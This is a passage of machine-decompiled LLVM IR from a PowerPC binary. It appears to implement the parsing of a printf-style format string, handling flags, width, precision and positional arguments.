  %v2_10006498 = add i32 %v0_10006498, %v1_10006490
  store i32 %v2_10006498, i32* %r9.global-to-local, align 4
  %v0_1000649c = load i32, i32* @r27, align 4
  %v2_1000649c = add i32 %v2_10006498, 8
  %v3_1000649c = inttoptr i32 %v2_1000649c to i32*
  store i32 %v0_1000649c, i32* %v3_1000649c, align 4
  %v0_100064b8.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100064a0

dec_label_pc_100064a0:                            ; preds = %dec_label_pc_10006480, %dec_label_pc_10006490
  %v0_100064b8.pre = phi i32 [ %v0_10006494, %dec_label_pc_10006480 ], [ %v0_100064b8.pre.pre, %dec_label_pc_10006490 ]
  %v0_100064a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100064a0 = add i32 %v0_100064a0, 1100
  %v2_100064a0 = inttoptr i32 %v1_100064a0 to i32*
  %v3_100064a0 = load i32, i32* %v2_100064a0, align 4
  store i32 %v3_100064a0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100064b8

dec_label_pc_100064ac:                            ; preds = %dec_label_pc_100064b8
  %v2_100064c0 = icmp sgt i32 %v0_10006504, 4094
  br i1 %v2_100064c0, label %dec_label_pc_100064b4, label %dec_label_pc_100064b0

dec_label_pc_100064b0:                            ; preds = %dec_label_pc_100064ac
  %v1_100064b0 = add i32 %v2_100064c8, -48
  store i32 %v1_100064b0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100064b4

dec_label_pc_100064b4:                            ; preds = %dec_label_pc_100064ac, %dec_label_pc_100064b0
  %v0_100064bc15 = phi i32 [ %v0_10006504, %dec_label_pc_100064ac ], [ %v1_100064b0, %dec_label_pc_100064b0 ]
  %v1_100064b4 = add i32 %v0_10006534, 1
  store i32 %v1_100064b4, i32* @r30, align 4
  br label %dec_label_pc_100064b8

dec_label_pc_100064b8:                            ; preds = %dec_label_pc_100064a0, %dec_label_pc_100064b4
  %v0_10006504 = phi i32 [ 0, %dec_label_pc_100064a0 ], [ %v0_100064bc15, %dec_label_pc_100064b4 ]
  %v0_10006534 = phi i32 [ %v0_100064b8.pre, %dec_label_pc_100064a0 ], [ %v1_100064b4, %dec_label_pc_100064b4 ]
  %v1_100064b8 = inttoptr i32 %v0_10006534 to i8*
  %v2_100064b8 = load i8, i8* %v1_100064b8, align 1
  %v3_100064b8 = zext i8 %v2_100064b8 to i32
  store i32 %v3_100064b8, i32* %r8.global-to-local, align 4
  %v1_100064bc = mul i32 %v0_10006504, 10
  %v1_100064c4 = mul nuw nsw i32 %v3_100064b8, 2
  store i32 %v1_100064c4, i32* %r9.global-to-local, align 4
  %v2_100064c8 = add i32 %v3_100064b8, %v1_100064bc
  store i32 %v2_100064c8, i32* %r11.global-to-local, align 4
  %v2_100064cc = add i32 %v1_100064c4, %v3_100064a0
  %v3_100064cc = inttoptr i32 %v2_100064cc to i16*
  %v4_100064cc = load i16, i16* %v3_100064cc, align 2
  %v5_100064cc = zext i16 %v4_100064cc to i32
  store i32 %v5_100064cc, i32* %r0.global-to-local, align 4
  %v1_100064d0 = and i32 %v5_100064cc, 8
  store i32 %v1_100064d0, i32* %r9.global-to-local, align 4
  %v3_100064d0 = icmp eq i32 %v1_100064d0, 0
  br i1 %v3_100064d0, label %dec_label_pc_100064d8, label %dec_label_pc_100064ac

dec_label_pc_100064d8:                            ; preds = %dec_label_pc_100064b8
  %v0_100064d8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100064d8 = add i32 %v0_100064d8, -1
  %v2_100064d8 = inttoptr i32 %v1_100064d8 to i8*
  %v3_100064d8 = load i8, i8* %v2_100064d8, align 1
  %v4_100064d8 = zext i8 %v3_100064d8 to i32
  store i32 %v4_100064d8, i32* %r0.global-to-local, align 4
  %v3_100064dc = icmp eq i8 %v3_100064d8, 37
  br i1 %v3_100064dc, label %dec_label_pc_100064e4, label %dec_label_pc_100065ac

dec_label_pc_100064e4:                            ; preds = %dec_label_pc_100064d8
  %v3_100064e4 = icmp eq i8 %v2_100064b8, 36
  br i1 %v3_100064e4, label %dec_label_pc_100064ec, label %dec_label_pc_10006520

dec_label_pc_100064ec:                            ; preds = %dec_label_pc_100064e4
  %tmp58 = icmp slt i32 %v0_10006504, 1
  br i1 %tmp58, label %dec_label_pc_10006520, label %dec_label_pc_100064f4

dec_label_pc_100064f4:                            ; preds = %dec_label_pc_100064ec
  %v0_100064f4 = load i32, i32* @r26, align 4
  %v3_100064f4 = icmp eq i32 %v0_100064f4, 0
  %v1_100064f8 = add i32 %v0_10006534, 1
  store i32 %v1_100064f8, i32* %r10.global-to-local, align 4
  br i1 %v3_100064f4, label %dec_label_pc_100068bc, label %dec_label_pc_10006500

dec_label_pc_10006500:                            ; preds = %dec_label_pc_100064f4
  %v3_10006500 = icmp sgt i32 %v0_10006504, %v0_100064f4
  br i1 %v3_10006500, label %dec_label_pc_1000650c, label %dec_label_pc_10006518

dec_label_pc_1000650c:                            ; preds = %dec_label_pc_10006500
  store i32 %v0_10006504, i32* @r26, align 4
  br label %dec_label_pc_10006518

dec_label_pc_10006514:                            ; preds = %dec_label_pc_1000653c, %dec_label_pc_10006534
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_10006518

dec_label_pc_10006518:                            ; preds = %dec_label_pc_10006500, %dec_label_pc_1000650c, %dec_label_pc_10006514
  %v0_10006518 = phi i32 [ %v0_100064d8, %dec_label_pc_10006514 ], [ %v1_100064f8, %dec_label_pc_1000650c ], [ %v1_100064f8, %dec_label_pc_10006500 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_10006514 ], [ %v0_10006504, %dec_label_pc_1000650c ], [ %v0_10006504, %dec_label_pc_10006500 ]
  br label %dec_label_pc_10006554

dec_label_pc_10006520:                            ; preds = %dec_label_pc_100064e4, %dec_label_pc_100064ec
  %v0_10006520 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_10006520, 1
  br i1 %tmp59, label %dec_label_pc_10006534, label %dec_label_pc_10006528

dec_label_pc_10006528:                            ; preds = %dec_label_pc_10006520
  %v3_10006528 = icmp eq i8 %v2_100064b8, 109
  br i1 %v3_10006528, label %dec_label_pc_100065ac, label %dec_label_pc_100068bc

dec_label_pc_10006534:                            ; preds = %dec_label_pc_10006520
  %v3_10006534 = icmp ugt i32 %v0_10006534, %v0_100064d8
  br i1 %v3_10006534, label %dec_label_pc_1000653c, label %dec_label_pc_10006514

dec_label_pc_1000653c:                            ; preds = %dec_label_pc_10006534
  %v1_1000653c = inttoptr i32 %v0_100064d8 to i8*
  %v2_1000653c = load i8, i8* %v1_1000653c, align 1
  %v3_1000653c = zext i8 %v2_1000653c to i32
  store i32 %v3_1000653c, i32* %r0.global-to-local, align 4
  store i32 %v0_100064d8, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_10006548 = icmp eq i8 %v2_1000653c, 48
  br i1 %v3_10006548, label %dec_label_pc_10006514, label %dec_label_pc_100065b0

dec_label_pc_10006554:                            ; preds = %dec_label_pc_10006570, %dec_label_pc_10006518
  %v0_10006574 = phi i32 [ %v0_10006518, %dec_label_pc_10006518 ], [ %v1_10006574, %dec_label_pc_10006570 ]
  store i32 %v0_10006574, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000e64c.244 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10006564 = inttoptr i32 %v0_10006574 to i8*
  br label %dec_label_pc_1000655c

dec_label_pc_1000655c:                            ; preds = %dec_label_pc_1000657c, %dec_label_pc_10006554
  %v1_10006570 = phi i32 [ %v1_10006580, %dec_label_pc_1000657c ], [ 1, %dec_label_pc_10006554 ]
  %v0_1000655c = phi i32 [ %v1_10006560, %dec_label_pc_1000657c ], [ ptrtoint ([8 x i8]* @global_var_1000e64c.244 to i32), %dec_label_pc_10006554 ]
  %v1_1000655c = inttoptr i32 %v0_1000655c to i8*
  %v2_1000655c = load i8, i8* %v1_1000655c, align 1
  %v3_1000655c = zext i8 %v2_1000655c to i32
  store i32 %v3_1000655c, i32* %r9.global-to-local, align 4
  %v1_10006560 = add i32 %v0_1000655c, 1
  store i32 %v1_10006560, i32* %r11.global-to-local, align 4
  %v2_10006564 = load i8, i8* %v1_10006564, align 1
  %v3_10006564 = zext i8 %v2_10006564 to i32
  store i32 %v3_10006564, i32* %r0.global-to-local, align 4
  %v4_10006568 = icmp eq i8 %v2_10006564, %v2_1000655c
  br i1 %v4_10006568, label %dec_label_pc_10006570, label %dec_label_pc_1000657c

dec_label_pc_10006570:                            ; preds = %dec_label_pc_1000655c
  %v0_10006570 = load i32, i32* %r5.global-to-local, align 4
  %v2_10006570 = or i32 %v0_10006570, %v1_10006570
  store i32 %v2_10006570, i32* %r5.global-to-local, align 4
  %v1_10006574 = add i32 %v0_10006574, 1
  br label %dec_label_pc_10006554

dec_label_pc_1000657c:                            ; preds = %dec_label_pc_1000655c
  %v1_1000657c = inttoptr i32 %v1_10006560 to i8*
  %v2_1000657c = load i8, i8* %v1_1000657c, align 1
  %v3_1000657c = zext i8 %v2_1000657c to i32
  store i32 %v3_1000657c, i32* %r0.global-to-local, align 4
  %v1_10006580 = mul i32 %v1_10006570, 2
  store i32 %v1_10006580, i32* %r10.global-to-local, align 4
  %v3_10006584 = icmp eq i8 %v2_1000657c, 0
  br i1 %v3_10006584, label %dec_label_pc_1000658c, label %dec_label_pc_1000655c

dec_label_pc_1000658c:                            ; preds = %dec_label_pc_1000657c
  %v1_1000658c = add i32 %v0_10006574, -1
  %v2_1000658c = inttoptr i32 %v1_1000658c to i8*
  %v3_1000658c = load i8, i8* %v2_1000658c, align 1
  %v4_1000658c = zext i8 %v3_1000658c to i32
  store i32 %v4_1000658c, i32* %r0.global-to-local, align 4
  %v0_10006590 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006590 = and i32 %v0_10006590, 10
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_10006598 = udiv i32 %v1_10006590, 2
  store i32 %v1_10006598, i32* %r9.global-to-local, align 4
  %v3_1000659c = icmp eq i8 %v3_1000658c, 37
  %v2_100065a0 = sub nuw nsw i32 -1, %v1_10006598
  %v3_100065a0 = and i32 %v0_10006590, %v2_100065a0
  store i32 %v3_100065a0, i32* %r5.global-to-local, align 4
  br i1 %v3_1000659c, label %dec_label_pc_100065b0, label %dec_label_pc_1000647c

dec_label_pc_100065ac:                            ; preds = %dec_label_pc_100064d8, %dec_label_pc_10006528
  store i32 %v0_100064d8, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100065b0

dec_label_pc_100065b0:                            ; preds = %dec_label_pc_1000653c, %dec_label_pc_1000658c, %dec_label_pc_100065ac
  %v0_100065e4 = phi i32 [ 0, %dec_label_pc_1000658c ], [ %v0_10006504, %dec_label_pc_1000653c ], [ %v0_10006504, %dec_label_pc_100065ac ]
  %v1_100065f0 = phi i32 [ %v0_10006574, %dec_label_pc_1000658c ], [ %v0_10006534, %dec_label_pc_1000653c ], [ %v0_10006534, %dec_label_pc_100065ac ]
  %v0_100065ec = phi i32 [ %v1_10006560, %dec_label_pc_1000658c ], [ %v0_100064d8, %dec_label_pc_1000653c ], [ %v0_100064d8, %dec_label_pc_100065ac ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000658c ], [ %stack_var_-84.1, %dec_label_pc_1000653c ], [ %stack_var_-84.1, %dec_label_pc_100065ac ]
  %v1_100065b0 = inttoptr i32 %v0_100065ec to i8*
  %v2_100065b0 = load i8, i8* %v1_100065b0, align 1
  %v3_100065b0 = zext i8 %v2_100065b0 to i32
  store i32 %v3_100065b0, i32* %r0.global-to-local, align 4
  %v3_100065b4 = icmp eq i8 %v2_100065b0, 42
  br i1 %v3_100065b4, label %dec_label_pc_100065bc, label %dec_label_pc_100065fc

dec_label_pc_100065bc:                            ; preds = %dec_label_pc_100065b0
  %v0_100065bc = load i32, i32* @r26, align 4
  %v3_100065bc = icmp eq i32 %v0_100065bc, 0
  br i1 %v3_100065bc, label %dec_label_pc_100065ec, label %dec_label_pc_100065c4

dec_label_pc_100065c4:                            ; preds = %dec_label_pc_100065bc
  %v1_100065c4 = inttoptr i32 %v1_100065f0 to i8*
  %v2_100065c4 = load i8, i8* %v1_100065c4, align 1
  %v3_100065c4 = zext i8 %v2_100065c4 to i32
  store i32 %v3_100065c4, i32* %r0.global-to-local, align 4
  %v3_100065c8 = icmp eq i8 %v2_100065c4, 36
  br i1 %v3_100065c8, label %dec_label_pc_100065d0, label %dec_label_pc_100068bc

dec_label_pc_100065d0:                            ; preds = %dec_label_pc_100065c4
  %tmp60 = icmp slt i32 %v0_100065e4, 1
  br i1 %tmp60, label %dec_label_pc_100068bc, label %dec_label_pc_100065d8

dec_label_pc_100065d8:                            ; preds = %dec_label_pc_100065d0
  %v0_100065d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100065d8 = mul i32 %v0_100065d8, -4
  %v1_100065dc = add i32 %v1_100065f0, 1
  store i32 %v1_100065dc, i32* @r30, align 4
  %v0_100065e0 = load i32, i32* @r29, align 4
  %v2_100065e0 = add i32 %v0_100065e0, %v1_100065d8
  store i32 %v2_100065e0, i32* %r9.global-to-local, align 4
  %v2_100065e4 = add i32 %v2_100065e0, 12
  %v3_100065e4 = inttoptr i32 %v2_100065e4 to i32*
  store i32 %v0_100065e4, i32* %v3_100065e4, align 4
  %v0_10006604.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100065f8

dec_label_pc_100065ec:                            ; preds = %dec_label_pc_100065bc
  %v1_100065ec = add i32 %v0_100065ec, 1
  store i32 %v1_100065ec, i32* %r0.global-to-local, align 4
  %v4_100065f0 = icmp eq i32 %v1_100065ec, %v1_100065f0
  br i1 %v4_100065f0, label %dec_label_pc_100065f8, label %dec_label_pc_100068bc

dec_label_pc_100065f8:                            ; preds = %dec_label_pc_100065ec, %dec_label_pc_100065d8
  %v0_10006604.pre = phi i32 [ %v1_100065f0, %dec_label_pc_100065ec ], [ %v0_10006604.pre.pre, %dec_label_pc_100065d8 ]
  store i32 -2147483648, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100065fc

dec_label_pc_100065fc:                            ; preds = %dec_label_pc_100065b0, %dec_label_pc_100065f8
  %v0_10006604 = phi i32 [ %v1_100065f0, %dec_label_pc_100065b0 ], [ %v0_10006604.pre, %dec_label_pc_100065f8 ]
  %v0_10006614 = phi i32 [ %v0_100065e4, %dec_label_pc_100065b0 ], [ -2147483648, %dec_label_pc_100065f8 ]
  %v0_100065fc = load i32, i32* %r4.global-to-local, align 4
  %v3_100065fc = icmp eq i32 %v0_100065fc, 0
  %v1_10006604 = inttoptr i32 %v0_10006604 to i8*
  br i1 %v3_100065fc, label %dec_label_pc_10006604, label %dec_label_pc_10006628

dec_label_pc_10006604:                            ; preds = %dec_label_pc_100065fc
  %v2_10006604 = load i8, i8* %v1_10006604, align 1
  %v3_10006604 = zext i8 %v2_10006604 to i32
  store i32 %v3_10006604, i32* %r0.global-to-local, align 4
  %v3_10006608 = icmp eq i8 %v2_10006604, 46
  br i1 %v3_10006608, label %dec_label_pc_10006610, label %dec_label_pc_10006620

dec_label_pc_10006610:                            ; preds = %dec_label_pc_10006604
  %v1_10006610 = add i32 %v0_10006604, 1
  store i32 %v0_10006614, i32* @r31, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000647c

dec_label_pc_10006620:                            ; preds = %dec_label_pc_10006604
  store i32 %v0_10006614, i32* @r31, align 4
  br label %dec_label_pc_10006628

dec_label_pc_10006628:                            ; preds = %dec_label_pc_100065fc, %dec_label_pc_10006620
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10006620 ], [ %v0_10006614, %dec_label_pc_100065fc ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_10006628 = load i8, i8* %v1_10006604, align 1
  %v3_10006628 = zext i8 %v2_10006628 to i32
  store i32 %v3_10006628, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000e5f4.245 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006634

dec_label_pc_10006634:                            ; preds = %dec_label_pc_10006640, %dec_label_pc_10006628
  %v0_10006640 = phi i32 [ %v1_10006640, %dec_label_pc_10006640 ], [ ptrtoint ([9 x i8]* @global_var_1000e5f4.245 to i32), %dec_label_pc_10006628 ]
  %v1_10006634 = inttoptr i32 %v0_10006640 to i8*
  %v2_10006634 = load i8, i8* %v1_10006634, align 1
  %v3_10006634 = zext i8 %v2_10006634 to i32
  store i32 %v3_10006634, i32* %r0.global-to-local, align 4
  %v4_10006638 = icmp eq i8 %v2_10006628, %v2_10006634
  br i1 %v4_10006638, label %dec_label_pc_10006404, label %dec_label_pc_10006640

dec_label_pc_10006640:                            ; preds = %dec_label_pc_10006634
  %v1_10006640 = add i32 %v0_10006640, 1
  %v2_10006640 = inttoptr i32 %v1_10006640 to i8*
  %v3_10006640 = load i8, i8* %v2_10006640, align 1
  %v4_10006640 = zext i8 %v3_10006640 to i32
  store i32 %v4_10006640, i32* %r0.global-to-local, align 4
  store i32 %v1_10006640, i32* %r11.global-to-local, align 4
  %v3_10006644 = icmp eq i8 %v3_10006640, 0
  br i1 %v3_10006644, label %dec_label_pc_1000664c, label %dec_label_pc_10006634

dec_label_pc_1000664c:                            ; preds = %dec_label_pc_10006640, %dec_label_pc_10006404
  %v0_10006674 = phi i32 [ %v1_10006404, %dec_label_pc_10006404 ], [ %v0_10006604, %dec_label_pc_10006640 ]
  %v0_10006670 = phi i32 [ %v0_10006640, %dec_label_pc_10006404 ], [ %v1_10006640, %dec_label_pc_10006640 ]
  %v2_10006654 = sub i32 %v0_10006670, ptrtoint ([9 x i8]* @global_var_1000e5f4.245 to i32)
  store i32 %v2_10006654, i32* %r9.global-to-local, align 4
  %v2_10006658 = icmp sgt i32 %v2_10006654, 1
  br i1 %v2_10006658, label %dec_label_pc_10006678, label %dec_label_pc_10006660

dec_label_pc_10006660:                            ; preds = %dec_label_pc_1000664c
  %v1_10006660 = inttoptr i32 %v0_10006674 to i8*
  %v2_10006660 = load i8, i8* %v1_10006660, align 1
  %v3_10006660 = zext i8 %v2_10006660 to i32
  store i32 %v3_10006660, i32* %r0.global-to-local, align 4
  %v1_10006664 = inttoptr i32 %v0_10006670 to i8*
  %v2_10006664 = load i8, i8* %v1_10006664, align 1
  %v3_10006664 = zext i8 %v2_10006664 to i32
  store i32 %v3_10006664, i32* %r9.global-to-local, align 4
  %v4_10006668 = icmp eq i8 %v2_10006660, %v2_10006664
  br i1 %v4_10006668, label %dec_label_pc_10006670, label %dec_label_pc_10006678

dec_label_pc_10006670:                            ; preds = %dec_label_pc_10006660
  %v1_10006670 = add i32 %v0_10006670, 9
  store i32 %v1_10006670, i32* %r11.global-to-local, align 4
  %v1_10006674 = add i32 %v0_10006674, 1
  store i32 %v1_10006674, i32* @r30, align 4
  br label %dec_label_pc_10006678

dec_label_pc_10006678:                            ; preds = %dec_label_pc_10006660, %dec_label_pc_1000664c, %dec_label_pc_10006670
  %v0_1000667c = phi i32 [ %v0_10006670, %dec_label_pc_10006660 ], [ %v0_10006670, %dec_label_pc_1000664c ], [ %v1_10006670, %dec_label_pc_10006670 ]
  %v0_10006678 = phi i32 [ %v0_10006674, %dec_label_pc_10006660 ], [ %v0_10006674, %dec_label_pc_1000664c ], [ %v1_10006674, %dec_label_pc_10006670 ]
  %v1_10006678 = inttoptr i32 %v0_10006678 to i8*
  %v2_10006678 = load i8, i8* %v1_10006678, align 1
  %v3_10006678 = zext i8 %v2_10006678 to i32
  store i32 %v3_10006678, i32* %r10.global-to-local, align 4
  %v1_1000667c = add i32 %v0_1000667c, 9
  %v2_1000667c = inttoptr i32 %v1_1000667c to i8*
  %v3_1000667c = load i8, i8* %v2_1000667c, align 1
  %v4_1000667c = zext i8 %v3_1000667c to i32
  store i32 %v4_1000667c, i32* %r0.global-to-local, align 4
  %v3_10006680 = icmp eq i8 %v2_10006678, 0
  %v1_10006684 = mul nuw nsw i32 %v4_1000667c, 256
  store i32 %v1_10006684, i32* %r8.global-to-local, align 4
  br i1 %v3_10006680, label %dec_label_pc_100068bc, label %dec_label_pc_1000668c

dec_label_pc_1000668c:                            ; preds = %dec_label_pc_10006678
  %v3_10006690 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_10006690, i32* %r11.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e634.246 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r3.global-to-local, align 4
  %v1_1000669c = and i32 %v1_10006684, 1024
  store i32 %v1_1000669c, i32* %r0.global-to-local, align 4
  %v3_1000669c = icmp eq i32 %v1_1000669c, 0
  store i32 ptrtoint (i32* @global_var_1000e628.247 to i32), i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e634.246 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100066ac

dec_label_pc_100066ac:                            ; preds = %dec_label_pc_10006710, %dec_label_pc_1000668c
  %v1_100066b8 = phi i32 [ %v1_10006710, %dec_label_pc_10006710 ], [ ptrtoint ([21 x i8]* @global_var_1000e634.246 to i32), %dec_label_pc_1000668c ]
  %v1_100066ac = inttoptr i32 %v1_100066b8 to i8*
  %v2_100066ac = load i8, i8* %v1_100066ac, align 1
  %v3_100066ac = zext i8 %v2_100066ac to i32
  store i32 %v3_100066ac, i32* %r0.global-to-local, align 4
  %v4_100066b0 = icmp eq i8 %v2_100066ac, %v2_10006678
  br i1 %v4_100066b0, label %dec_label_pc_100066b8, label %dec_label_pc_10006710

dec_label_pc_100066b8:                            ; preds = %dec_label_pc_100066ac
  %v2_100066b8 = sub i32 %v1_100066b8, ptrtoint ([21 x i8]* @global_var_1000e634.246 to i32)
  %tmp61 = icmp slt i32 %v2_100066b8, 18
  %brmerge = or i1 %v3_1000669c, %tmp61
  br i1 %brmerge, label %dec_label_pc_100066cc, label %dec_label_pc_100066c8

dec_label_pc_100066c8:                            ; preds = %dec_label_pc_100066b8
  %v1_100066c8 = add i32 %v2_100066b8, -2
  br label %dec_label_pc_100066cc

dec_label_pc_100066cc:                            ; preds = %dec_label_pc_100066b8, %dec_label_pc_100066c8
  %storemerge = phi i32 [ %v1_100066c8, %dec_label_pc_100066c8 ], [ %v2_100066b8, %dec_label_pc_100066b8 ]
  %v0_100066cc = phi i32 [ %v1_100066c8, %dec_label_pc_100066c8 ], [ %v2_100066b8, %dec_label_pc_100066b8 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100066cc = load i32, i32* @r28, align 4
  %v2_100066cc = add i32 %v1_100066cc, 32
  %v3_100066cc = inttoptr i32 %v2_100066cc to i32*
  store i32 %v0_100066cc, i32* %v3_100066cc, align 4
  store i32 ptrtoint (i32* @global_var_1000e627.248 to i32), i32* %r11.global-to-local, align 4
  %v0_100066d8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100066d4

dec_label_pc_100066d4:                            ; preds = %dec_label_pc_100066d4, %dec_label_pc_100066cc
  %v0_100066d4 = phi i32 [ %v1_100066d4, %dec_label_pc_100066d4 ], [ ptrtoint (i32* @global_var_1000e627.248 to i32), %dec_label_pc_100066cc ]
  %v1_100066d4 = add i32 %v0_100066d4, 1
  %v2_100066d4 = inttoptr i32 %v1_100066d4 to i8*
  %v3_100066d4 = load i8, i8* %v2_100066d4, align 1
  %v4_100066d4 = zext i8 %v3_100066d4 to i32
  store i32 %v4_100066d4, i32* %r0.global-to-local, align 4
  store i32 %v1_100066d4, i32* %r11.global-to-local, align 4
  %v3_100066d8 = icmp sgt i32 %v0_100066d8.pre, %v4_100066d4
  br i1 %v3_100066d8, label %dec_label_pc_100066d4, label %dec_label_pc_100066e0

dec_label_pc_100066e0:                            ; preds = %dec_label_pc_100066d4
  %v0_100066e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100066e0 = sub i32 %v1_100066d4, %v0_100066e0
  %v1_100066e8 = mul i32 %v2_100066e0, 2
  store i32 %v1_100066e8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e618.249 to i32), i32* %r9.global-to-local, align 4
  %v2_100066f0 = add i32 %v1_100066e8, ptrtoint (i32* @global_var_1000e618.249 to i32)
  %v3_100066f0 = inttoptr i32 %v2_100066f0 to i16*
  %v4_100066f0 = load i16, i16* %v3_100066f0, align 2
  %v5_100066f0 = sext i16 %v4_100066f0 to i32
  store i32 %v5_100066f0, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e608.250 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e634.246 to i32), i32* %r7.global-to-local, align 4
  %v2_10006700 = add i32 %v1_100066e8, ptrtoint (i32* @global_var_1000e608.250 to i32)
  %v3_10006700 = inttoptr i32 %v2_10006700 to i16*
  %v4_10006700 = load i16, i16* %v3_10006700, align 2
  %v5_10006700 = sext i16 %v4_10006700 to i32
  store i32 %v5_10006700, i32* %r0.global-to-local, align 4
  %v2_10006704 = or i32 %v5_100066f0, %v1_10006684
  %v2_10006708 = and i32 %v5_10006700, %v2_10006704
  store i32 %v2_10006708, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000671c

dec_label_pc_10006710:                            ; preds = %dec_label_pc_100066ac
  %v1_10006710 = add i32 %v1_100066b8, 1
  %v2_10006710 = inttoptr i32 %v1_10006710 to i8*
  %v3_10006710 = load i8, i8* %v2_10006710, align 1
  %v4_10006710 = zext i8 %v3_10006710 to i32
  store i32 %v4_10006710, i32* %r0.global-to-local, align 4
  store i32 %v1_10006710, i32* %r7.global-to-local, align 4
  %v3_10006714 = icmp eq i8 %v3_10006710, 0
  br i1 %v3_10006714, label %dec_label_pc_1000671c, label %dec_label_pc_100066ac

dec_label_pc_1000671c:                            ; preds = %dec_label_pc_10006710, %dec_label_pc_100066e0
  %v0_1000671c = phi i32 [ %v2_10006708, %dec_label_pc_100066e0 ], [ %v3_10006690, %dec_label_pc_10006710 ]
  store i32 %v0_1000671c, i32* %stack_var_-96, align 4
  %v0_10006720 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006720 = call i32 @__asm_rlwinm(i32 %v0_10006720, i32 30, i32 31, i32 31)
  %not.v2_10006724 = icmp eq i32 %v1_10006720, 0
  %v6_10006728 = sext i1 %not.v2_10006724 to i32
  store i32 %v6_10006728, i32* %r9.global-to-local, align 4
  %v1_1000672c = call i32 @__asm_rlwinm(i32 %v1_10006684, i32 0, i32 20, i32 23)
  store i32 %v1_1000672c, i32* %r0.global-to-local, align 4
  %v0_10006730 = load i32, i32* @r30, align 4
  %v1_10006730 = inttoptr i32 %v0_10006730 to i8*
  %v2_10006730 = load i8, i8* %v1_10006730, align 1
  %v3_10006730 = zext i8 %v2_10006730 to i32
  store i32 %v3_10006730, i32* %r10.global-to-local, align 4
  %v1_10006734 = call i32 @__asm_rlwinm(i32 %v6_10006728, i32 0, i32 0, i32 27)
  store i32 %v1_10006734, i32* %r9.global-to-local, align 4
  %v0_10006738 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006738 = call i32 @__asm_rlwinm(i32 %v0_10006738, i32 0, i32 30, i32 28)
  %v1_1000673c = add i32 %v1_10006734, 48
  store i32 %v1_1000673c, i32* %r9.global-to-local, align 4
  %v2_10006740 = or i32 %v1_10006738, %v1_1000672c
  store i32 %v2_10006740, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v0_10006748 = load i32, i32* %r10.global-to-local, align 4
  %v1_10006748 = load i32, i32* @r28, align 4
  %v2_10006748 = add i32 %v1_10006748, 12
  %v3_10006748 = inttoptr i32 %v2_10006748 to i32*
  store i32 %v0_10006748, i32* %v3_10006748, align 4
  %v0_1000674c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000674c = load i32, i32* @r28, align 4
  %v2_1000674c = add i32 %v1_1000674c, 4
  %v3_1000674c = inttoptr i32 %v2_1000674c to i32*
  store i32 %v0_1000674c, i32* %v3_1000674c, align 4
  %v0_10006750 = load i32, i32* @r31, align 4
  %v1_10006750 = load i32, i32* @r28, align 4
  %v2_10006750 = add i32 %v1_10006750, 8
  %v3_10006750 = inttoptr i32 %v2_10006750 to i32*
  store i32 %v0_10006750, i32* %v3_10006750, align 4
  %v0_10006754 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006754 = load i32, i32* @r28, align 4
  %v2_10006754 = add i32 %v1_10006754, 20
  %v3_10006754 = inttoptr i32 %v2_10006754 to i32*
  store i32 %v0_10006754, i32* %v3_10006754, align 4
  %v0_10006758 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006758 = load i32, i32* @r28, align 4
  %v2_10006758 = add i32 %v1_10006758, 16
  %v3_10006758 = inttoptr i32 %v2_10006758 to i32*
  store i32 %v0_10006758, i32* %v3_10006758, align 4
  %v0_1000675c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000675c = load i32, i32* @r28, align 4
  %v2_1000675c = add i32 %v1_1000675c, 28
  %v3_1000675c = inttoptr i32 %v2_1000675c to i32*
  store i32 %v0_1000675c, i32* %v3_1000675c, align 4
  %v0_10006760 = load i32, i32* %r7.global-to-local, align 4
  %v1_10006760 = inttoptr i32 %v0_10006760 to i8*
  %v2_10006760 = load i8, i8* %v1_10006760, align 1
  %v3_10006760 = zext i8 %v2_10006760 to i32
  store i32 %v3_10006760, i32* %r9.global-to-local, align 4
